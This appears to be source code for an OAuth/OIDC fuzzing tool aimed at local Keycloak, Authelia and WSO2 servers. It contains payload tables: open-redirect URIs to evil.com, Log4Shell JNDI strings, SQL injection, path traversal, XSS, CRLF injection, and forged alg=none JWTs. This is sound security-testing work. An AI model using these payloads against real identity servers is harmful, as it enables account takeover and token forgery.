#!/usr/bin/env python3
"""Boofuzz and Selenium adapter integrations for OAuth fuzzing."""

import os
import random
import hashlib
import time
import base64
import json
import urllib.parse
from typing import Dict, List

class BoofuzzAdapter:
    def __init__(self, oauth_cfg: Dict):
        self.oauth_cfg = oauth_cfg or {}
        # 使用 importlib 动态加载，避免未安装时的静态导入告警
        import importlib
        try:
            self.bf = importlib.import_module('boofuzz')
            self.available = True
        except Exception:
            self.bf = None
            self.available = False
        self._load_dictionaries()
        
        # NEW: Enhanced OAuth-specific mutation patterns
        self._oauth_attack_patterns = self._build_oauth_attack_patterns()
        self._authelia_specific_patterns = self._build_authelia_patterns()
        self._wso2_specific_patterns = self._build_wso2_patterns()

        # CVE-knowledge ablation switch (set by OAuthFuzzMinimalFuzzer via
        # config fuzzing.disable_cve_patterns). When True, CVE-derived
        # mutation heuristics (attack value tables, PKCE attack cases,
        # open-redirect payloads, JWT alg-confusion variants) are disabled;
        # RFC-derived structure-preserving mutation stays active.
        self._cve_disabled = False

    def _build_oauth_attack_patterns(self) -> Dict[str, List[str]]:
        """Build OAuth-specific attack vectors based on known vulnerabilities"""
        return {
            'redirect_uri': [
                'http://evil.com/callback',
                'https://attacker.com/steal',
                '//evil.com/callback',
                'http://127.0.0.1.evil.com/callback',
                'http://localhost@evil.com/callback',
                'http://evil.com/callback#',
                'http://evil.com/callback?',
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
                '\\\\evil.com\\callback',
                'http://127.0.0.1:7777/callback/../../../etc/passwd',
                'http://127.0.0.1:7777/callback%00.evil.com',
                'http://127.0.0.1:7777/callback%2f..%2f..%2f',
            ],
            'scope': [
                'openid profile email admin',
                'openid profile email groups offline_access superuser',
                'openid * admin',
                'openid ${admin}',
                'openid ../admin',
                'openid%20admin',
                'openid\tadmin',
                'openid\nadmin',
            ],
            'state': [
                '',
                'a',
                'A' * 10000,
                '<script>alert(1)</script>',
                '${jndi:ldap://evil.com/a}',
                '\x00\x00\x00\x00',
                "'; DROP TABLE users; --",
                '../../../etc/passwd',
            ],
            'code_verifier': [
                'A' * 10,   # Too short
                'A' * 500,  # Too long
                '',
                '\x00' * 64,
                'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~',
            ],
            'client_id': [
                'admin',
                'fuzz-client\x00admin',
                '../../../admin',
                "${jndi:ldap://evil.com/a}",
                "' OR '1'='1",
            ],
            'response_type': [
                'token',           # Implicit flow (should be blocked)
                'code token',      # Hybrid
                'code id_token',   # Hybrid
                'token id_token',  # Implicit
                'code token id_token',
                'none',
                '*',
            ],
        }
    
    def _build_authelia_patterns(self) -> Dict[str, List[str]]:
        """Build Authelia-specific attack patterns"""
        return {
            'firstfactor': [
                # Username injection
                {'username': "admin' OR '1'='1", 'password': 'test'},
                {'username': 'admin\x00attacker', 'password': 'test'},
                {'username': '${jndi:ldap://evil.com/a}', 'password': 'test'},
                {'username': '../../../etc/passwd', 'password': 'test'},
                {'username': 'admin', 'password': 'A' * 10000},  # Buffer overflow
            ],
            'totp': [
                '000000',
                '999999',
                'AAAAAA',
                '12345678',
                '\x00\x00\x00\x00\x00\x00',
                '',
            ],
            'session': [
                '',
                'invalid_session_cookie',
                'A' * 10000,
                '\x00\x00\x00\x00',
                '../../../',
            ],
        }

    def _build_wso2_patterns(self) -> Dict[str, list]:
        """Build WSO2 Identity Server-specific attack patterns"""
        return {
            'session_data_key': [
                {'sessionDataKey': 'invalid_key_12345'},
                {'sessionDataKey': ''},
                {'sessionDataKey': 'A' * 10000},
                {'sessionDataKey': '../../../etc/passwd'},
                {'sessionDataKey': '${jndi:ldap://evil.com/a}'},
                {'tocommonauth': 'false'},
                {'tocommonauth': '../../../'},
            ],
            'dcr': [
                {'client_name': 'admin\x00evil'},
                {'client_name': '../../../etc/passwd'},
                {'grant_types': ['authorization_code', 'password', 'client_credentials',
                                 'urn:ietf:params:oauth:grant-type:jwt-bearer']},
                {'redirect_uris': ['javascript:alert(1)', 'http://evil.com/callback']},
            ],
            'scim2_filter': [
                'userName eq "admin"',
                'userName eq ""',
                'userName pr and userName sw "a"',
                "userName eq 'admin' or 1=1",
                'userName eq "admin"\x00',
                'userName eq "${jndi:ldap://evil.com/a}"',
            ],
            'consent': [
                {'approval': 'deny'},
                {'approval': '../../../'},
                {'approvedScope': 'openid profile admin'},
                {'sessionDataKeyConsent': 'replayed_key'},
            ],
            'introspect': [
                {'token_type_hint': 'access_token'},
                {'token_type_hint': 'refresh_token'},
                {'token_type_hint': '../../../etc/passwd'},
                {'token': '${jndi:ldap://evil.com/a}'},
            ],
        }

    def _load_dictionaries(self):
        """Load fuzzing dictionaries for injection attacks"""
        self.dictionaries = {}
        # P6: dictionaries live at the repo root; core/dictionaries never existed,
        # so file dictionaries were silently empty before this fix.
        repo_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        dict_path = os.path.join(repo_root, 'dictionaries')
        
        dict_files = ['sql.dict', 'js.dict', 'html_tags.dict', 'json.dict', 'xml.dict', 'oauth.dict']
        for dict_file in dict_files:
            filepath = os.path.join(dict_path, dict_file)
            if os.path.exists(filepath):
                try:
                    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                        tokens = []
                        for line in f:
                            line = line.strip()
                            if line and not line.startswith('#'):
                                if line.startswith('"') and line.endswith('"'):
                                    tokens.append(line[1:-1])
                                else:
                                    tokens.append(line)
                        self.dictionaries[dict_file] = tokens
                except Exception:
                    pass

    def _inject_from_dictionary(self, value: str, dict_name: str = 'sql.dict') -> str:
        """Inject dictionary tokens into parameter value"""
        if dict_name in self.dictionaries and self.dictionaries[dict_name]:
            token = random.choice(self.dictionaries[dict_name])
            injection_points = [
                value + token,
                token + value,
                value.replace(' ', f' {token} ') if ' ' in value else value + token,
                token,
            ]
            return random.choice(injection_points)
        return value

    def is_available(self) -> bool:
        return bool(self.available)

    def _fuzz_string(self, s: str) -> str:
        import random
        if self.bf:
            try:
                # 使用 FuzzableString 简单渲染一个变体
                fs = self.bf.String(default_value=s, fuzzable=True, max_len=max(32, len(s) + 16))
                # Boofuzz 的原生会在会话中迭代，这里简单返回默认值的轻微变体
                return s + random.choice(['_', '.', '-fzz', str(random.randint(0, 999))])
            except Exception:
                pass
        # 回退：轻度扰动
        if not s:
            return ''
        b = bytearray(s.encode('utf-8', errors='ignore'))
        if not b:
            return s
        idx = random.randint(0, len(b) - 1)
        b[idx] ^= 0x0F
        return b.decode('utf-8', errors='ignore')

    def generate_overrides(self) -> Dict[str, Dict[str, str]]:
        import random, hashlib, time
        cid = self.oauth_cfg.get('client_id', 'fuzz-client')
        ruri = self.oauth_cfg.get('redirect_uri', 'http://127.0.0.1:7777/callback')
        allow_extra = bool(self.oauth_cfg.get('allow_redirect_uri_extra_param', False))
        base_ruri = ruri.split('?')[0]
        benign_ruri = base_ruri + ('?cb=' + hashlib.md5(str(time.time()).encode()).hexdigest()[:8] if allow_extra else '')
        base_scope = self.oauth_cfg.get('scope', 'openid profile email')
        extras = ['address', 'phone']
        if random.random() < 0.1:
            extras.append('offline_access')
        add = random.choice(extras) if random.random() < 0.3 else ''
        safe_scope = base_scope + (f" {add}" if add else '')

        overrides = {
            'Authorize': {
                'response_type': 'code',
                'client_id': cid,
                'redirect_uri': benign_ruri,
                'scope': safe_scope
            },
            'TokenExchange': {
                'client_secret': self._fuzz_string(self.oauth_cfg.get('client_secret', 'fuzz-client-secret'))
            },
            'UserInfo': {
                'authorization': f"Bearer {self._make_jwt_variant()}"
            }
        }
        
        # Advanced PKCE mutations (35% probability)
        if random.random() < 0.35:
            pk = self._make_pkce_mutation()
            for k in ('code_challenge', 'code_challenge_method'):
                if k in pk:
                    overrides['Authorize'][k] = pk[k]
            if 'code_verifier' in pk:
                overrides['TokenExchange']['code_verifier'] = pk['code_verifier']
        
        # Advanced PKCE attack mutations (15% probability; CVE-derived —
        # gated by the CVE-knowledge ablation switch)
        if random.random() < 0.15 and not self._cve_disabled:
            pk_adv = self._make_pkce_advanced_mutations()
            if pk_adv:
                for k, v in pk_adv.items():
                    if v is None:
                        overrides['Authorize'].pop(k, None)
                    else:
                        overrides['Authorize'][k] = v
                if 'code_verifier' in pk_adv:
                    overrides['TokenExchange']['code_verifier'] = pk_adv.get('code_verifier', '')

        if random.random() < 0.03:
            overrides['Authorize']['redirect_uri'] = base_ruri + '/..\u2028callback' + 'A' * random.choice([256, 1024])

        # Open redirect attack vectors (5% probability; CVE-derived — gated)
        if random.random() < 0.05 and not self._cve_disabled:
            overrides['Authorize']['redirect_uri'] = self._make_open_redirect_uri(base_ruri)

        if random.random() < 0.3:
            overrides['Authorize']['state'] = self._fuzz_string(self.oauth_cfg.get('state', ''))
        if random.random() < 0.3:
            overrides['Authorize']['nonce'] = self._fuzz_string(self.oauth_cfg.get('nonce', ''))

        # Dictionary-based injection (10% probability)
        if random.random() < 0.1 and self.dictionaries:
            dict_name = random.choice(list(self.dictionaries.keys()))
            target_field = random.choice(['state', 'nonce', 'scope'])
            if target_field in overrides.get('Authorize', {}):
                overrides['Authorize'][target_field] = self._inject_from_dictionary(
                    overrides['Authorize'].get(target_field, ''), dict_name
                )

        for sym in ('RefreshToken', 'RevokeToken', 'Introspect', 'ClientCredentials'):
            d = overrides.get(sym, {})
            if isinstance(d, dict):
                import random as _r
                d['client_auth'] = _r.choice(['post', 'basic'])
                if sym == 'RevokeToken' and _r.random() < 0.4:
                    d['token_type_hint'] = _r.choice(['access_token', 'refresh_token', ''])
                overrides[sym] = d

        # Additional strategy-based mutations (20% probability)
        if random.random() < 0.20:
            if self._cve_disabled:
                # CVE-knowledge ablation: only generic RFC-level strategies
                # remain (dictionary wordlists, boundary values, protocol
                # edge cases); attack-table strategies are dropped.
                strategies = [
                    ('dictionary_injection', 0.45),
                    ('boundary_testing', 0.35),
                    ('protocol_confusion', 0.20),
                ]
            else:
                strategies = [
                    ('oauth_param_mutation', 0.25),
                    ('authelia_specific', 0.15),
                    ('wso2_specific', 0.20),
                    ('dictionary_injection', 0.15),
                    ('boundary_testing', 0.15),
                    ('protocol_confusion', 0.10),
                ]
            r = random.random()
            acc = 0.0
            strategy = 'oauth_param_mutation'
            for name, prob in strategies:
                acc += prob
                if r <= acc:
                    strategy = name
                    break
            
            extra = {}
            if strategy == 'oauth_param_mutation':
                extra = self._generate_oauth_mutations()
            elif strategy == 'authelia_specific':
                extra = self._generate_authelia_mutations()
            elif strategy == 'wso2_specific':
                extra = self._generate_wso2_mutations()
            elif strategy == 'dictionary_injection':
                extra = self._generate_dictionary_injections()
            elif strategy == 'boundary_testing':
                extra = self._generate_boundary_tests()
            elif strategy == 'protocol_confusion':
                extra = self._generate_protocol_confusion()
            
            for sym_key, sym_val in extra.items():
                if isinstance(sym_val, dict):
                    overrides.setdefault(sym_key, {}).update(sym_val)
                else:
                    overrides[sym_key] = sym_val

        # Malformed field injection (8% probability)
        if random.random() < 0.08:
            malformed = self._make_malformed_fields()
            if malformed:
                for field, val in malformed.items():
                    if field in ('username', 'password'):
                        overrides.setdefault('Login', {})[field] = val
                    else:
                        overrides.setdefault('Authorize', {})[field] = val

        return overrides

    def _make_open_redirect_uri(self, base_uri: str) -> str:
        """Generate open redirect attack payloads"""
        import urllib.parse
        parsed = urllib.parse.urlparse(base_uri)
        host = parsed.netloc
        
        payloads = [
            'https://evil.com/callback',
            f'http://{host}@evil.com/callback',
            f'{base_uri}/../../../etc/passwd',
            f'{base_uri.replace("callback", "callback%2F..%2F..%2F")}',
            'javascript:alert(1)',
            '//evil.com/callback',
            f'//{host}@evil.com/callback',
            f'{base_uri}?next=https://evil.com',
            f'https://evil.com#{base_uri}',
            f'{base_uri}\r\nX-Injected: evil',
        ]
        return random.choice(payloads)

    def _make_pkce_advanced_mutations(self) -> Dict[str, str]:
        """Advanced PKCE mutations targeting edge cases and attacks"""
        import random, string, hashlib, base64
        
        mutations = []
        
        # Generate a valid verifier first
        verifier = ''.join(random.choice(string.ascii_letters + string.digits + '-._~') for _ in range(64))
        challenge = base64.urlsafe_b64encode(hashlib.sha256(verifier.encode()).digest()).decode().rstrip('=')
        
        # 1. PKCE Downgrade Attack - remove PKCE entirely
        mutations.append({
            'code_challenge': None,
            'code_challenge_method': None,
            'code_verifier': None
        })
        
        # 2. Method Confusion - S256 challenge with plain method
        mutations.append({
            'code_challenge': challenge,
            'code_challenge_method': 'plain',
            'code_verifier': verifier
        })
        
        # 3. Plain challenge with S256 method (inverse confusion)
        mutations.append({
            'code_challenge': verifier,
            'code_challenge_method': 'S256',
            'code_verifier': verifier
        })
        
        # 4. Double-encoding attack
        mutations.append({
            'code_challenge': base64.b64encode(challenge.encode()).decode(),
            'code_challenge_method': 'S256',
            'code_verifier': verifier
        })
        
        # 5. Zero-width character injection
        mutations.append({
            'code_verifier': verifier + '\u200b' * 10,
            'code_challenge': challenge,
            'code_challenge_method': 'S256'
        })
        
        # 6. Empty challenge with valid method
        mutations.append({
            'code_challenge': '',
            'code_challenge_method': 'S256',
            'code_verifier': verifier
        })
        
        # 7. Case sensitivity test
        mutations.append({
            'code_challenge': challenge,
            'code_challenge_method': 's256',  # lowercase
            'code_verifier': verifier
        })
        
        # 8. Whitespace injection
        mutations.append({
            'code_challenge': ' ' + challenge + ' ',
            'code_challenge_method': 'S256',
            'code_verifier': ' ' + verifier + ' '
        })
        
        return random.choice(mutations)

    def _make_jwt_variant(self) -> str:
        import base64, json, time, random
        def b64(x: str) -> str:
            s = base64.urlsafe_b64encode(x.encode()).decode().rstrip("=")
            return s
        def b64j(obj: dict) -> str:
            s = base64.urlsafe_b64encode(json.dumps(obj, separators=(',', ':')).encode()).decode().rstrip("=")
            return s
        now = int(time.time())
        # 构造多组畸形/恶意变体，覆盖解析/签名/时间/尺寸等维度
        variants = []

        if not self._cve_disabled:
            # 1) alg=none（无签名）— CVE-derived algorithm-confusion pattern
            variants.append(f"{b64j({'alg':'none'})}.{b64j({'sub':'fuzz','exp':now+60})}.")

            # 2) HS256 假签名（随机secret生成的假第三段）— key-confusion pattern
            fake_sig = base64.urlsafe_b64encode(os.urandom(32)).decode().rstrip("=") if 'os' in globals() else ''.join(random.choice(string.ascii_letters) for _ in range(43))
            variants.append(f"{b64j({'alg':'HS256'})}.{b64j({'sub':'fuzz','exp':now+120,'scope':'openid profile'})}.{fake_sig}")

        # 3) 两段（截断签名）
        variants.append(f"{b64j({'alg':'RS256'})}.{b64j({'sub':'fuzz','exp':now+60})}")

        # 4) 非 base64url 字符（破坏头部解码）
        bad_head = '!!!not_b64!!!'
        bad_payload = '%%%invalid%%%'
        variants.append(f"{bad_head}.{bad_payload}.sig")

        # 5) 超长 kid 与路径/控制字符混杂（经 base64 包裹）
        long_kid = 'A'*2048 + '../' + 'B'*1024 + '\u2029'  # U+2029 分隔符
        variants.append(f"{b64j({'alg':'RS256','kid':long_kid})}.{b64j({'sub':'fuzz','exp':now+60})}.{b64('sig')}")

        # 6) 空 payload（缺关键声明）
        variants.append(f"{b64j({'alg':'RS256'})}.{b64('')}.{b64('sig')}")

        # 7) 时间戳异常（过期/未来 iat）
        variants.append(f"{b64j({'alg':'RS256'})}.{b64j({'sub':'fuzz','exp':now-1,'iat':now+999999})}.{b64('sig')}")

        # 8) 超长 payload（内存压力/解析压力）
        big_payload = {'sub':'fuzz','exp':now+60,'pad':'X'*random.choice([4096,16384,65536])}
        variants.append(f"{b64j({'alg':'RS256'})}.{b64j(big_payload)}.{b64('sig')}")

        # 9) alg=null/kid=null（类型异常）
        variants.append(f"{b64j({'alg':None,'kid':None})}.{b64j({'sub':'fuzz','exp':now+60})}.{b64('sig')}")

        # 10) 载荷为数组/非对象
        variants.append(f"{b64j({'alg':'RS256'})}.{b64j(['a','b','c'])}.{b64('sig')}")

        return random.choice(variants)
    
    def _make_authorization_variant(self) -> str:
        """构造 Authorization 头畸形/变体，提升服务端解析异常与绕过探测"""
        import random
        token = self._make_jwt_variant()
        schemes = [
            'Bearer', 'BEARER', 'bearer',
            'Bearer',  # 占位，下面做空白/Tab/Unicode变体
        ]
        # 空白/Tab/Unicode 变体
        spaces = [
            ' ', '  ', '\t', '\t\t', '\u00A0', '\u2003', '\u200B'  # NBSP/Em space/Zero-width space
        ]
        sep = random.choice(spaces)
        # 低概率为空 token 或仅方案（触发NPE类错误）
        if random.random() < 0.1:
            return random.choice(schemes) + sep
        if random.random() < 0.1:
            return random.choice(schemes)
        # 低概率超长 token（内存压力）
        if random.random() < 0.15:
            token = token + '.' + ('X' * random.choice([4096, 16384, 65536]))
        # 低概率重复空白混合
        if random.random() < 0.2:
            sep = sep + random.choice(spaces)
        return f"{random.choice(schemes)}{sep}{token}"

    def _make_pkce_mutation(self) -> Dict[str, str]:
        """构造 PKCE 越界与不一致组合：长度/字符集/方法不匹配/非法方法/超长挑战"""
        import random, string, hashlib, base64
        # 构造非法 verifier（长度越界+非法字符）
        length = random.choice([1, 10, 42, 128, 129, 512, 10000])
        alphabet = string.ascii_letters + string.digits + '-._~'
        # 注入非法字符集
        if random.random() < 0.5:
            alphabet += ' \t\u00A0\u2003\u200B!%$#@'
        verifier = ''.join(random.choice(alphabet) for _ in range(length))
        # 随机方法
        method = random.choice(['S256', 'plain', 'PLAIN', 's256', 'S257', '', None])
        # 随机挑战：可能与 verifier 不一致、或超长/含非法字符
        challenge = None
        if method and str(method).upper() == 'S256':
            digest = hashlib.sha256(verifier.encode('utf-8', errors='ignore')).digest()
            challenge = base64.urlsafe_b64encode(digest).decode().rstrip('=')
            if random.random() < 0.4:
                # 制造不一致挑战或非法字符/超长
                if random.random() < 0.5:
                    challenge = ''.join(random.choice(alphabet) for _ in range(random.choice([10, 256, 2048])))
                else:
                    challenge = challenge + random.choice(['!', '%', '#']) + ('X' * random.choice([256, 2048]))
        elif method and str(method).lower() == 'plain':
            challenge = verifier
            if random.random() < 0.5:
                # 明确破坏 plain：让 challenge 不等于 verifier 或超长
                challenge = verifier + random.choice(['!', '%']) + ('X' * random.choice([128, 1024]))
        else:
            # 非法方法时，随机挑战
            challenge = ''.join(random.choice(alphabet) for _ in range(random.choice([10, 256, 2048])))

        return {
            'code_verifier': verifier,
            'code_challenge_method': method if method is not None else '',
            'code_challenge': challenge
        }

    def _generate_oauth_mutations(self) -> Dict:
        """Generate OAuth-specific parameter mutations"""
        import random
        overrides = {}
        
        # Randomly select parameters to mutate
        params_to_mutate = random.sample(
            list(self._oauth_attack_patterns.keys()),
            k=min(2, len(self._oauth_attack_patterns))
        )
        
        for param in params_to_mutate:
            attack_values = self._oauth_attack_patterns[param]
            selected_value = random.choice(attack_values)
            
            # Apply to relevant symbols
            if param == 'redirect_uri':
                overrides.setdefault('Authorize', {})[param] = selected_value
                overrides.setdefault('AuthorizeBadRedirectUri', {})[param] = selected_value
            elif param == 'scope':
                overrides.setdefault('Authorize', {})[param] = selected_value
                overrides.setdefault('AuthorizeScopeEscalation', {})[param] = selected_value
            elif param == 'state':
                overrides.setdefault('Authorize', {})[param] = selected_value
            elif param == 'code_verifier':
                overrides.setdefault('TokenExchange', {})[param] = selected_value
            elif param == 'response_type':
                overrides.setdefault('AuthorizeImplicit', {})[param] = selected_value
        
        return overrides
    
    def _generate_authelia_mutations(self) -> Dict:
        """Generate Authelia-specific mutations"""
        import random
        overrides = {}
        
        # Select Authelia-specific pattern
        pattern_type = random.choice(list(self._authelia_specific_patterns.keys()))
        patterns = self._authelia_specific_patterns[pattern_type]
        
        if pattern_type == 'firstfactor':
            selected = random.choice(patterns)
            overrides['AutheliaFirstFactor'] = selected
            overrides['Login'] = selected
        elif pattern_type == 'totp':
            selected = random.choice(patterns)
            overrides['AutheliaSecondFactor'] = {'totp_code': selected}
        elif pattern_type == 'session':
            selected = random.choice(patterns)
            overrides['_session_override'] = selected
        
        return overrides
    
    def _generate_dictionary_injections(self) -> Dict:
        """Generate injection attacks from dictionaries"""
        import random
        overrides = {}
        
        dict_type = random.choice(list(self.dictionaries.keys()) or ['sql'])
        if dict_type in self.dictionaries and self.dictionaries[dict_type]:
            injection_payload = random.choice(self.dictionaries[dict_type])
            
            # Apply to multiple fields
            target_fields = ['state', 'nonce', 'username', 'password']
            target_field = random.choice(target_fields)
            
            if target_field in ('username', 'password'):
                overrides['Login'] = {target_field: injection_payload}
                overrides['AutheliaFirstFactor'] = {target_field: injection_payload}
            else:
                overrides['Authorize'] = {target_field: injection_payload}
        
        return overrides
    
    def _generate_boundary_tests(self) -> Dict:
        """Generate boundary condition tests"""
        import random
        overrides = {}
        
        boundary_tests = [
            # Empty values
            {'Authorize': {'state': '', 'nonce': ''}},
            # Maximum lengths
            {'Authorize': {'state': 'A' * 10000, 'scope': 'B' * 5000}},
            # Minimum lengths
            {'Authorize': {'state': 'a'}},
            # Null bytes
            {'Authorize': {'state': '\x00' * 10}},
            # Unicode edge cases
            {'Authorize': {'state': '\uFFFE\uFFFF'}},
            {'Login': {'username': '\x00admin', 'password': 'test\x00extra'}},
            # Integer overflow simulation
            {'TokenExchange': {'code': '9' * 500}},
        ]
        
        return random.choice(boundary_tests)
    
    def _generate_protocol_confusion(self) -> Dict:
        """Generate protocol confusion attacks"""
        import random
        overrides = {}
        
        confusion_attacks = [
            # HTTP method confusion
            {'_http_method': random.choice(['PUT', 'DELETE', 'PATCH', 'OPTIONS'])},
            # Content-Type confusion
            {'_content_type': random.choice([
                'text/xml',
                'application/xml',
                'multipart/form-data',
                'text/plain',
                'application/json\x00',
            ])},
            # Accept header manipulation
            {'_accept': random.choice([
                'application/xml',
                '*/*',
                'text/html, application/json;q=0.1',
            ])},
        ]
        
        return random.choice(confusion_attacks)

    def _generate_wso2_mutations(self) -> Dict:
        """Generate WSO2 Identity Server-specific mutations"""
        import random
        overrides = {}

        if not self._wso2_specific_patterns:
            return overrides

        pattern_type = random.choice(list(self._wso2_specific_patterns.keys()))
        patterns = self._wso2_specific_patterns[pattern_type]

        if pattern_type == 'session_data_key':
            selected = random.choice(patterns)
            overrides['Login'] = selected
            overrides['Wso2Login'] = selected
        elif pattern_type == 'dcr':
            selected = random.choice(patterns)
            overrides['Wso2DCRRegister'] = {'payload': selected}
        elif pattern_type == 'scim2_filter':
            selected = random.choice(patterns)
            overrides['Wso2SCIM2Users'] = {'filter': selected}
        elif pattern_type == 'consent':
            selected = random.choice(patterns)
            overrides['Wso2ConsentBypass'] = selected
        elif pattern_type == 'introspect':
            selected = random.choice(patterns)
            overrides['Wso2Introspect'] = selected
            overrides['Introspect'] = selected

        return overrides

    def _make_malformed_fields(self) -> Dict[str, str]:
        """构造可能触发缓冲区溢出/解析崩溃的畸形字段（超长/NULL字节/CRLF/Unicode）"""
        import random
        fields = {}
        # 超长 username/password（内存压力）
        if random.random() < 0.15:
            fields['username'] = 'A' * random.choice([4096, 16384, 65536])
        if random.random() < 0.15:
            fields['password'] = 'B' * random.choice([4096, 16384, 65536])
        # NULL 字节注入（可能触发 C 扩展解析错误）
        if random.random() < 0.1:
            fields['state'] = 'normal\x00injected' + ('C' * 256)
        if random.random() < 0.1:
            fields['nonce'] = 'nonce\x00padding' + ('D' * 512)
        # CRLF 注入（HTTP 头注入/响应拆分）
        if random.random() < 0.1:
            fields['redirect_uri'] = 'http://example.com/cb\r\nX-Injected: true\r\n\r\n' + ('E' * 128)
        # Unicode 溢出/特殊字符
        if random.random() < 0.15:
            fields['scope'] = 'openid\u2028profile\u2029' + ('\uFFFD' * random.choice([256, 1024]))
        return fields

class SeleniumSULAdapter:
    def __init__(self, oauth_cfg: Dict):
        self.oauth = oauth_cfg or {}
        import importlib
        self.KC = None
        try:
            kcmod = importlib.import_module('keycloakClient')
            self.KC = getattr(kcmod, 'KeycloakAdminClient', None)
        except Exception:
            self.KC = None
        # 状态映射
        self.success_tokens = {'SUCCESS', 'VALID_GRANT'}
        self.unauth_tokens = {'ACCESS_DENIED', 'UNAUTHORIZED_CLIENT'}
        self.bad_tokens = {
            'INVALID_CLIENT', 'INVALID_GRANT', 'INVALID_REQUEST', 'INVALID_SCOPE',
            'UNSUPPORTED_GRANT_TYPE', 'INVALID_REDIRECT_URI', 'INVALID_STATE',
            'INVALID_RESPONSE_TYPE', 'INVALID_CODE_VERIFIER', 'MISMATCHING_CODE_CHALLENGE_METHOD',
            'EXPIRED_AUTHORIZATION_CODE', 'NO_ACCESS_TOKEN', 'INVALID_ACCESS_TOKEN'
        }

    def is_available(self) -> bool:
        return self.KC is not None

    def _map_status(self, s: str) -> str:
        s = (s or '').upper()
        if s in self.success_tokens:
            return 'Success'
        if s in self.unauth_tokens:
            return 'Unauthorized'
        if s in self.bad_tokens:
            return 'BadRequest'
        if s == 'NO_RESPONSE':
            return 'Status0'
        return 'BadRequest'

    def query(self, symbols: List[str]) -> List[str]:
        if not self.is_available():
            return ['Error'] * len(symbols)
        kc = self.KC(
            keycloak_url=self.oauth.get('base_url', 'http://127.0.0.1:8080'),
            realm=self.oauth.get('realm', 'fuzz'),
            client_id=self.oauth.get('client_id', 'fuzz-client'),
            client_secret=self.oauth.get('client_secret', 'fuzz-client-secret'),
            username=self.oauth.get('user', 'testuser'),
            password=self.oauth.get('password', 'testpass'),
            redirect_uri=self.oauth.get('redirect_uri', 'http://127.0.0.1:7777/callback'),
        )
        results = []
        for sym in symbols:
            r = kc.sendAndRecv({'type': sym})
            results.append(self._map_status(str(r)))
        return results